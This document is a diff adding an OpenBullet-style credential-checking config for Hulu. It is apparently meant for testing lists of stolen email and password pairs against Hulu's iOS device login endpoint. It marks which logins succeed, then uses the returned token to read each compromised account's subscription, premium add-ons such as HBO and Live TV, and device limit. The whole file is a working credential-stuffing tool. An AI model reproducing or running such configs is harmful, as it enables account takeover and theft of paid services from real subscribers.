@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "Hulu IOS",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-23T07:43:01.1277031+03:00",
+  "AdditionalInfo": "",
+  "Author": "MixFix",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" 
+  CONTENT "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=<PASS>&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#verify_login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid" 
+
+#1 PARSE "<SOURCE>" LR "user_token\":\"" "\"" -> VAR "1" 
+
+#user REQUEST GET "https://home.hulu.com/v1/users/self" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <1>" 
+
+#free_check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "subscription\":{\"id" 
+  KEYCHAIN Failure OR 
+    KEY "status\":null,\"subscriber_id" 
+    KEY "\"status\":\"6\",\"subscriber_id\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "package_ids\":[],\"" 
+    KEY "package_ids\":[\"1\",\"2\"],\"" 
+
+#2 PARSE "<SOURCE>" LR "package_ids\":[\"1\",\"2\"," "]" -> VAR "2" 
+
+#no_commercial FUNCTION Replace "\"14\"" "No Commercials" "<2>" -> VAR "2" 
+
+#showtime FUNCTION Replace "\"15\"" "Showtime" "<2>" -> VAR "2" 
+
+#hbo FUNCTION Replace "\"17\"" "HBO" "<2>" -> VAR "2" 
+
+#live_tv FUNCTION Replace "\"16\"" "Live TV" "<2>" -> VAR "2" 
+
+#cinemax FUNCTION Replace "\"18\"" "Cinemax" "<2>" -> VAR "2" 
+
+#starz FUNCTION Replace "\"19\"" "STARZ" "<2>" -> VAR "2" 
+
+#package PARSE "<2>" LR "" "" -> CAP "Package/s" 
+
+PARSE "<SOURCE>" LR "max_limit\":" ",\"" CreateEmpty=FALSE -> CAP "Device Limit" 
+
